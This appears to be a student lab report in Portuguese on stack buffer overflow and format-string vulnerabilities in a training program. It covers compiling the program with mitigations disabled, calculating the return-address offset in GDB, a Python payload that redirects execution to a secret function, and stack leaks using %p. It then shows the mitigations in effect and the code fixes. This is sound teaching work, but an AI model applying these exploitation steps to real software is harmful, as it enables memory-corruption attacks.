## Parte A — Buffer Overflow de Stack (CWE-120)

### Exercício 1 — Compilação sem mitigações

**Comando de compilação:**

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -g
```

**Explicação das flags:**

- **`-fno-stack-protector`** — Desativa o stack canary. O GCC insere por defeito um valor aleatório (canary) na stack antes do return address; na saída da função, verifica se esse valor foi alterado. Esta flag remove essa proteção, permitindo que um overflow sobrescreva o return address sem ser detetado.

- **`-z execstack`** — Marca a stack como executável. Por defeito, o kernel aplica NX (No-eXecute): a stack é marcada como não executável, impedindo que shellcode injetado na stack seja executado. Esta flag desativa essa proteção.

- **`-no-pie`** — Desativa o PIE (Position Independent Executable). Com PIE ativo, o binário é compilado como código independente de posição e carregado num endereço de base aleatório pelo ASLR. Com `-no-pie`, o binário é carregado sempre no mesmo endereço base (tipicamente `0x400000`), tornando os endereços de código fixos e previsíveis entre execuções.

- **`-g`** — Inclui informação de debug (símbolos, números de linha) no binário. Facilita a análise com o GDB mas não afeta as mitigações de segurança.

### Exercício 2 — Execução normal e exploração com GDB

**Execução normal:**

```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffea35e2340
[*] secret_function is at: 0x4011b6
[*] You entered: Hello
[*] Normal programme termination.
```

**Sessão GDB:**

```
(gdb) break process_input
Breakpoint 1 at 0x4011f6: file vuln.c, line 13.
(gdb) run Hello
Breakpoint 1, process_input (input=0x7fffffffdd7f "Hello") at vuln.c:13

(gdb) print &buffer
$1 = (char (*)[64]) 0x7fffffffd960

(gdb) info frame
Stack level 0, frame at 0x7fffffffd9b0:
 rip = 0x4011f6 in process_input (vuln.c:13); saved rip = 0x4012c7
 called by frame at 0x7fffffffd9d0
 Saved registers:
  rbp at 0x7fffffffd9a0, rip at 0x7fffffffd9a8

(gdb) print (void*)secret_function
$2 = (void *) 0x4011b6 <secret_function>
```

**Respostas às quatro questões:**

| # | Questão | Valor |
|---|---------|-------|
| 1 | Endereço de `buffer` na stack | `0x7fffffffd960` |
| 2 | Endereço do return address guardado (`saved rip`) | `0x7fffffffd9a8` |
| 3 | Bytes entre `buffer` e o return address | `0x7fffffffd9a8 - 0x7fffffffd960 = 0x48 = **72 bytes**` |
| 4 | Endereço de `secret_function` | `0x4011b6` |

**Cálculo do offset:**

```
offset = 0x40  (buffer até saved RBP, 64 bytes)
       + 0x08  (saved RBP até saved return address, 8 bytes)
       = 0x48  = 72 bytes
```

### Exercício 3 — Desencadear o overflow

**Payload construído:**

O endereço `0x4011b6` em little-endian de 8 bytes é `\xb6\x11\x40\x00\x00\x00\x00\x00`.  
São necessários 72 bytes de padding (`A`) para atingir o return address, seguidos do endereço de `secret_function`.

**Comando:**

```bash
./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
```

**Output:**

```
-bash: warning: command substitution: ignored null byte in input
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffee7459d60
[*] secret_function is at: 0x4011b6
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒@

[!] ACCESS GRANTED: you reached the secret function!
[!] In a real exploit, this could be arbitrary code execution.
```

O exploit teve sucesso: ao sobrescrever o return address com `0x4011b6`, quando `process_input` executou a instrução `ret`, o fluxo de execução foi redirecionado para `secret_function` em vez de regressar ao `main`.

> **Nota:** O aviso `ignored null byte in input` é esperado — o bash não passa bytes nulos em argumentos de linha de comandos. Contudo, os bytes nulos do endereço (`\x00\x00\x00\x00\x00`) ficam truncados, o que não compromete o exploit neste caso porque os bytes altos do endereço são zero e a memória já continha zeros nessas posições.

### Exercício 4 — Efeito das mitigações

#### Caso 1 — Stack canary ativo (`-fno-stack-protector` removido)

**Compilação:**

```bash
gcc -o vuln vuln.c -z execstack -no-pie -g
```

**Ataque:**

```bash
./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
```

**Output:**

```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffc8b819c00
[*] secret_function is at: 0x4011d6
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒@
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

**Análise:** O exploit **falhou**. O stack canary detetou que a stack foi corrompida. O GCC insere um valor aleatório (canary) entre o buffer e o saved RBP/return address. Na saída da função, o valor é verificado; como o overflow o sobrescreveu, o programa aborta com `stack smashing detected` antes de executar a instrução `ret`.

---

#### Caso 2 — PIE/ASLR ativo (`-no-pie` removido)

**Compilação:**

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -g
```

**Ataque:**

```bash
./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
```

**Output:**

```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffe640afb40
[*] secret_function is at: 0x56259d5ee1c9
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒@
Segmentation fault (core dumped)
```

**Análise:** O exploit **falhou**. Com PIE ativo, o binário é compilado como código independente de posição e o ASLR do kernel carrega-o num endereço base aleatório a cada execução. O endereço de `secret_function` passou de `0x4011b6` para `0x56259d5ee1c9` — completamente diferente. O payload usou o endereço antigo e fixo, tentando saltar para uma zona de memória inválida, resultando em `Segmentation fault`.

---

#### Caso 3 — Todas as mitigações por defeito

**Compilação:**

```bash
gcc -o vuln vuln.c -g
```

**Ataque:**

```bash
./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
```

**Output:**

```
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7fff751c0d10
[*] secret_function is at: 0x559cb19b31e9
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒@
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

**Análise:** O exploit **falhou** com ambas as mitigações ativas simultaneamente. O stack canary detetou a corrupção da stack antes de chegar ao `ret`, e o PIE/ASLR tornaria o endereço hardcoded inválido mesmo que o canary não estivesse presente. A combinação das duas mitigações reforça significativamente a proteção: para contornar ambas seria necessário, em geral, uma fuga de informação que revelasse os endereços em tempo de execução (info leak).

### Exercício 5 — Remediação segura

**Código corrigido (`vuln.c`):**

```c
void process_input(char *input) {
    char buffer[64];
    printf("[*] Buffer is at: %p\n", (void *)buffer);
    printf("[*] secret_function is at: %p\n", (void *)secret_function);

    /* Verificação explícita de comprimento antes de copiar */
    if (strlen(input) >= sizeof(buffer)) {
        fprintf(stderr, "[!] Error: input is too long and will overflow the buffer!\n");
        exit(1);
    }

    strncpy(buffer, input, sizeof(buffer) - 1);  /* alternativa segura ao strcpy */
    buffer[sizeof(buffer) - 1] = '\0';            /* garantir terminação nula */

    printf("[*] You entered: %s\n", buffer);
}
```

**Compilação com todas as mitigações:**

```bash
gcc -o vuln_safe vuln.c -g
```

**Testes:**

```bash
$ ./vuln_safe "Hello"
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffcc3d32760
[*] secret_function is at: 0x55a4b326c229
[*] You entered: Hello
[*] Normal programme termination.

$ ./vuln_safe $(python3 -c "print('A'*72)")
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7fffe5def2a0
[*] secret_function is at: 0x557f6aaed229
[!] Error: input is too long and will overflow the buffer!
```

**Justificação das alterações:**

1. **`strcpy` → `strncpy`** — O `strcpy` copia até encontrar um byte nulo, sem verificar o tamanho do destino (CWE-120). O `strncpy` limita a cópia a `sizeof(buffer) - 1` bytes, impedindo a escrita além dos limites do buffer. A terminação nula explícita (`buffer[sizeof(buffer) - 1] = '\0'`) garante que a string está sempre corretamente terminada.

2. **Verificação explícita de comprimento** — A verificação `strlen(input) >= sizeof(buffer)` antes da cópia garante que entradas demasiado longas são rejeitadas antes de qualquer operação de cópia, eliminando completamente o risco de overflow nesta função.

3. **Compilação com mitigações por defeito** — O binário `vuln_safe` é compilado sem flags que desativem proteções, pelo que beneficia de stack canary, PIE/ASLR e NX stack, adicionando camadas de defesa em profundidade mesmo que existissem outros caminhos de vulnerabilidade.

## Parte B — Vulnerabilidade de String de Formato (CWE-134)

### Exercício 6 — Compilação e diagnósticos do compilador

**Compilação com flags de aviso:**

```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security
```

**Output do compilador:**

```
fmtvuln.c: In function 'process_input':
fmtvuln.c:10:5: warning: format not a string literal and no format arguments [-Wformat-security]
   10 |     printf(input);             /* CWE-134: user input used as format string */
      |     ^~~~~~
```

**Compilação sem flags de aviso e execução normal:**

```bash
gcc -o fmtvuln fmtvuln.c -g
./fmtvuln "Hello, world!"
```

```
[*] Address of secret on stack: 0x7ffc7eefb070
[*] Processing input...
Hello, world!
[*] Normal programme termination.
```

**Análise dos avisos do compilador:**

O aviso `-Wformat-security` indica exatamente a linha vulnerável: `printf(input)` usa uma variável controlada pelo utilizador diretamente como string de formato, sem argumentos adicionais. O compilador identifica este padrão como potencialmente perigoso porque, se `input` contiver especificadores de formato (como `%p`, `%x`, `%n`), o `printf` tentará ler ou escrever argumentos que não foram fornecidos.

Os avisos do compilador são uma forma útil de análise estática porque detetam automaticamente padrões de código inseguros conhecidos sem executar o programa. Contudo, não são suficientes por si só: apenas identificam padrões sintáticos óbvios, não conseguem detetar vulnerabilidades lógicas mais subtis, e podem produzir falsos negativos quando a string de formato chega ao `printf` por caminhos indiretos (ponteiros de função, estruturas de dados, etc.).

---

### Exercício 7 — Desencadear a vulnerabilidade

**Execução com especificadores `%p`:**

```bash
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
```

**Output:**

```
[*] Address of secret on stack: 0x7fff4b234990
[*] Processing input...
0x55f2a230f2a0 (nil) 0x7f85b153d5a4 0x7f85b1624b20 0x410 (nil) 0x7fff4b235d94 0xcafebabe 0xb49474ba4dbad800 0x7fff4b2349c0
[*] Normal programme termination.
```

**Análise:**

Em vez de imprimir literalmente `%p %p %p...`, o programa imprimiu valores da stack e dos registos. Cada `%p` fez com que o `printf` lesse e imprimisse um valor com a largura de um ponteiro (8 bytes em x86-64) a partir da stack da chamada.

O `printf` não tem mecanismo para verificar se o número de argumentos passados pelo chamador corresponde ao número de especificadores na string de formato. Em x86-64, os primeiros argumentos são passados em registos (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`); os restantes ficam na stack. Como não foram passados argumentos além da própria string, o `printf` lê os valores que por acaso estão nos registos e na stack no momento da chamada, expondo dados arbitrários do processo.

**Execução com especificadores `%x`:**

```bash
./fmtvuln "%x %x %x %x %x %x %x %x %x %x"
```

**Output:**

```
[*] Address of secret on stack: 0x7ffd9a34ac20
[*] Processing input...
699fc2a0 0 e28ba5a4 e29a1b20 410 0 9a34cd94 cafebabe 5d55300 9a34ac50
```

**Diferença entre `%p` e `%x`:** O `%x` imprime valores em hexadecimal sem prefixo `0x` e apenas os 32 bits baixos de cada valor, enquanto o `%p` imprime o valor completo de 64 bits com prefixo `0x` e representa valores nulos como `(nil)`. Para um processo de 64 bits, o `%p` é mais apropriado porque lê e exibe os 8 bytes completos de cada palavra da stack, enquanto o `%x` trunca os 4 bytes altos, podendo perder informação relevante (como a parte alta de endereços de stack ou heap).

### Exercício 8 — Localizar um valor na stack

**Execução com 30 especificadores `%p`:**

```bash
./fmtvuln "$(python3 -c "print('%p ' * 30, end='')")"
```

**Output:**

```
[*] Address of secret on stack: 0x7ffdb8b2d020
[*] Processing input...
0x558db07062a0 (nil) 0x7f171658d5a4 0x7f1716674b20 0x410 (nil) 0x7ffdb8b2dd57
0xcafebabe 0xd97273f559bffb00 0x7ffdb8b2d050 0x558da290d2a5 0x7ffdb8b2d178
0x2b8b2d178 0x7ffdb8b2d0f0 0x7f171649b1ca 0x7ffdb8b2d0a0 0x7ffdb8b2d178
0x2a290c040 0x558da290d24d 0x7ffdb8b2d178 0x3aa8270dd305cbb2 0x2 (nil)
0x558da290fda0 0x7f17166c5000 0x3aa8270dd225cbb2 0x3b7d7afb11e7cbb2
0x7ffd00000000 (nil) (nil)
```

**Localização do valor sentinela:**

O valor `0xcafebabe` aparece na **posição 8** da sequência de `%p`. O programa imprimiu o endereço de `secret` como `0x7ffdb8b2d020`; o valor `0xcafebabe` encontrado na posição 8 corresponde ao conteúdo dessa variável local na stack.

Note-se que o `%p` suprime zeros à esquerda, pelo que `0x00000000cafebabe` aparece como `0xcafebabe`.

**O que este exercício demonstra:**

Este exercício demonstra que uma vulnerabilidade de string de formato permite a um atacante **ler valores arbitrários da stack** sem qualquer acesso privilegiado. A informação que pode ser recuperada inclui: valores de variáveis locais sensíveis (como a variável `secret` com valor `0xcafebabe`), endereços de retorno guardados na stack (úteis para contornar ASLR), endereços de variáveis locais e do heap, e valores de canaries de stack (que poderiam ser usados para contornar a proteção de stack smashing). Todos estes dados residem no espaço de endereçamento do processo, na zona da stack — uma região que normalmente não deveria ser acessível através de input do utilizador.

### Exercício 9 — Remediação segura

**Linha corrigida:**

```c
// ANTES (vulnerável — CWE-134):
printf(input);

// DEPOIS (seguro):
printf("%s", input);
```

A correção consiste em passar `input` como **argumento de dados** e não como **string de formato**. Com `printf("%s", input)`, a string de formato é o literal `"%s"` — controlado pelo programador — e `input` é tratado como uma sequência de caracteres a imprimir. Mesmo que `input` contenha `%p`, `%x` ou `%n`, esses caracteres são interpretados como dados e impressos literalmente, nunca como instruções de formato.

**Verificação — o exploit já não funciona:**

```bash
gcc -o fmtvuln fmtvuln.c -g
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
```

```
[*] Address of secret on stack: 0x7fff0b289910
[*] Processing input...
%p %p %p %p %p %p %p %p %p %p
[*] Normal programme termination.
```

Os especificadores são impressos literalmente — nenhum valor da stack é divulgado.

**Verificação — sem avisos do compilador:**

```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security
```

Nenhum aviso produzido — o compilador confirma que o código está correto.
